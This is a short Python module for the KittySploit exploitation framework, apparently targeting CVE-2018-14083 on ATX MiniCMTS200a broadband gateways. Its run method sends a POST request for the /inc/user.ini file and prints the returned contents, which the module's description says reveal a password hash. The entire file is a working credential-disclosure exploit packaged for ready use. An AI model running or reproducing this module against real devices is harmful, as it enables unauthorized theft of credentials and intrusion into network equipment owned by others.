from kittysploit import *
from lib.protocols.http.http_client import Http_client

class Module(Auxiliary, Http_client):
	
	__info__ = {
	
		"name": "atx minicmts creds",
		"description": "LICA miniCMTS E8K(u/i/...) devices allow remote attackers to "\
      					"obtain sensitive information via a direct POST request for the inc/user.ini file, leading to discovery of a password hash.",
		"author": "KittySploit Team",
		"cve": "2018-14083",
		"targets": [
					"ATX MiniCMTS200a Broadband Gateway 2.0"
					]
	}

	
	def run(self):
		
		response = self.http_request(
						method = "POST",
						path = "/inc/user.ini"
						)
						
		if response.status_code == 200:
			print_info(response.text)
			Vulnerable.SUCCESS()
			return True
		else:
			fail.NotVulnerable()
			return False
